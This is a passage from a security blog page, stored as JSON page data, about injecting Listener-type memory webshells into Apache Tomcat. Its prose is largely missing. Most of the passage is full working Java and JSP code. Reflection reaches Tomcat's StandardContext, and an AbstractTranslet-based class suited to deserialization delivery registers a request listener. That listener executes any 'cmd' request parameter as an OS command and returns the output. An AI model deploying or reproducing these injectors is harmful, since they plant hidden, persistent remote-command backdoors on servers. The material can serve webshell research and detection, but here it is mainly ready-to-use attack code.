class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\">import org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import javax.servlet.ServletContext;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        //requestresponse</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field context= null;</span><br><span class=\"line\">            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            context.setAccessible(true);</span><br><span class=\"line\">            ThreadLocal threadLocal=(ThreadLocal) context.get(null);</span><br><span class=\"line\">            ServletRequest request=null;</span><br><span class=\"line\">            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;</span><br><span class=\"line\">                request= (ServletRequest) threadLocal.get();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(request!=null)&#123;</span><br><span class=\"line\">                //context</span><br><span class=\"line\">                ServletContext servletContext=request.getServletContext();</span><br><span class=\"line\">                if(servletContext!=null)&#123;</span><br><span class=\"line\">                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    appctx.setAccessible(true);</span><br><span class=\"line\">                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    stdctx.setAccessible(true);</span><br><span class=\"line\">                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    //listener</span><br><span class=\"line\">                    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">                    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">                    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">                    listenerList.add(new ListenerInject());</span><br><span class=\"line\">                    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            System.out.println(cmd);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>over</p>\n<h3 id=\"listener\"><a href=\"#listener\" class=\"headerlink\" title=\"listener\"></a>listener</h3><p><code>addApplicationEventListener</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">standardContext.addApplicationEventListener(new Testlistener());</span><br></pre></td></tr></table></figure>\n\n<p>jsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //listener</span><br><span class=\"line\">    standardContext.addApplicationEventListener(new Testlistener());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p> filter  listener </p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p> <code>filter</code>  <code>filter</code>  <code>webshell</code>  <code>listener</code>  <code>listener</code> </p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p> <code>Listener</code> webshell <code>request</code>  <code>Listener</code></p>\n<p><code>requestInitialized</code> <code>ServletRequestEvent</code> servlet <code>ServletRequestEvent</code>  <code>request</code> </p>\n<p> <code>getServletRequest</code>  <code>request</code> </p>\n<p> <code>ServletRequest</code> </p>\n<p> <code>org.apache.catalina.connector.RequestFacade</code> </p>\n<p> <code>request</code>  <code>Request</code> </p>\n<p> <code>Listener</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.Filter;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p> <code>Listener</code> </p>\n<p></p>\n<p> <code>StandardContext$listenerStart</code> <code>listeners</code> </p>\n<p><code>listeners</code>  <code>String</code>  <code>listener</code> , <code>findApplicationListeners</code> </p>\n<p><code>results</code>  <code>listener</code> </p>\n<p> <code>results</code>  <code>listener</code>  <code>TestListener</code>  <code>eventListeners</code> </p>\n<p> <code>getApplicationEventListeners</code>  <code>applicationEventListenersList</code>  <code>applicationEventListener</code>  <code>eventListeners</code>  <code>setApplicationEventListeners</code> <code>eventListeners</code> <code>ApplicationEventListeners</code> <code>applicationEventListener</code>  <code>set</code>  <code>setApplicationEventListeners</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setApplicationEventListeners(Object[] listeners) &#123;</span><br><span class=\"line\">        this.applicationEventListenersList.clear();</span><br><span class=\"line\">        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;</span><br><span class=\"line\">            this.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <code>applicationEventListenersList</code> </p>\n<p> <code>instance</code>  <code>lsitener</code>  <code>listener</code> </p>\n<p></p>\n<p> <code>requestInitialized</code>  <code>StandardContext$fireRequestInitEvent</code>  <code>listener</code>  <code>instances</code> <code>instances</code> <code>getApplicationEventListeners</code> </p>\n<p> <code>listener</code>  list</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">listenerList.add(new Testlistener());</span><br><span class=\"line\">standardContext.setApplicationEventListeners(listenerList.toArray());</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JSP\"><a href=\"#JSP\" class=\"headerlink\" title=\"JSP\"></a>JSP</h3><p> <code>JSP</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\">    </span><br><span class=\"line\">    //listener</span><br><span class=\"line\">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">    listenerList.add(new Testlistener());</span><br><span class=\"line\">    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p>demo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.ServletException;</span><br><span class=\"line\">import javax.servlet.http.HttpServlet;</span><br><span class=\"line\">import javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\">import 